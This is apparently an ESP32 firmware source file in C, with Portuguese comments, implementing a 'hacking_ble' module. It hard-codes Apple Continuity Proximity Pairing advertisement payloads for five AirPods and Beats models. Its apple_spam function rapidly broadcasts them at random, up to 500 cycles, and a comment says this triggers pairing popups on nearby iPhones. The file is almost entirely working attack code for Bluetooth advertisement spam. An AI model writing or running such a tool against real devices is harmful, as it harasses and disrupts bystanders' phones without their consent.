#include "hacking_ble.h"
#include "transport_ble.h"

#include <string.h>

#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"

static const char *TAG = "hack-ble";

// Apple Continuity Proximity Pairing payloads (subtype 0x07).
// Cada array começa com Company ID 0x004C (= 0x4C 0x00 LE) seguido de:
//   subtype 0x07, length 0x19, padding 0x01,
//   model id (2 bytes), 22 bytes do "AirPods status template" + zeros.
// Total de mfg_data por entrada = 29 bytes.
//
// Modelos de exemplo (combo provoca o popup de pareamento em iPhones próximos):
//   0x0220 = AirPods 1
//   0x0E20 = AirPods Pro 1
//   0x0A20 = AirPods Max
//   0x0620 = Beats Solo3
//   0x1020 = AirPods Pro 2
#define APPLE_PAYLOAD_LEN 29
#define APPLE_NUM_MODELS  5

static const uint8_t apple_payloads[APPLE_NUM_MODELS][APPLE_PAYLOAD_LEN] = {
    // {company id LE} {subtype} {len}  {01} {model LE}    rest
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x02,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x0E,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x0A,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x06,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x10,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
};

static bool s_busy = false;

static int spam_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)event; (void)arg;
    return 0;
}

esp_err_t hacking_ble_init(void)
{
    ESP_LOGI(TAG, "ready (%d apple models)", APPLE_NUM_MODELS);
    return ESP_OK;
}

esp_err_t hacking_ble_apple_spam(uint16_t cycles, uint16_t *out_sent)
{
    if (s_busy) return ESP_ERR_INVALID_STATE;
    if (cycles == 0) cycles = 50;
    if (cycles > 500) cycles = 500;

    s_busy = true;

    // Pausa adv normal (será retomada ao final)
    ble_gap_adv_stop();

    // ble_hs_id_set_rnd falha (rc=524) quando há conexão GATT ativa, então
    // usamos o endereço público existente. Trade-off: mesma MAC durante todo
    // o spam — iPhone pode coalescer popups por MAC. Aceitamos por enquanto.
    uint16_t sent = 0;
    for (uint16_t i = 0; i < cycles; i++) {
        // Pick random payload
        uint32_t r = esp_random();
        size_t pidx = r % APPLE_NUM_MODELS;

        // Garante adv parado antes de mudar fields
        ble_gap_adv_stop();

        struct ble_hs_adv_fields fields = {0};
        fields.mfg_data = apple_payloads[pidx];
        fields.mfg_data_len = APPLE_PAYLOAD_LEN;

        int rc = ble_gap_adv_set_fields(&fields);
        if (rc != 0) {
            ESP_LOGW(TAG, "set_fields rc=%d", rc);
            continue;
        }

        struct ble_gap_adv_params params = {0};
        params.conn_mode = BLE_GAP_CONN_MODE_NON;
        params.disc_mode = BLE_GAP_DISC_MODE_NON;
        params.itvl_min = 0x20;  // 20ms
        params.itvl_max = 0x30;  // 30ms

        rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
                               &params, spam_event_cb, NULL);
        if (rc != 0) {
            ESP_LOGW(TAG, "adv_start rc=%d", rc);
            continue;
        }

        sent++;
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    ble_gap_adv_stop();

    // Retoma adv do GATT
    transport_ble_advertising_resume();

    if (out_sent) *out_sent = sent;
    ESP_LOGI(TAG, "apple spam done: %u/%u cycles", (unsigned)sent, (unsigned)cycles);

    s_busy = false;
    return ESP_OK;
}
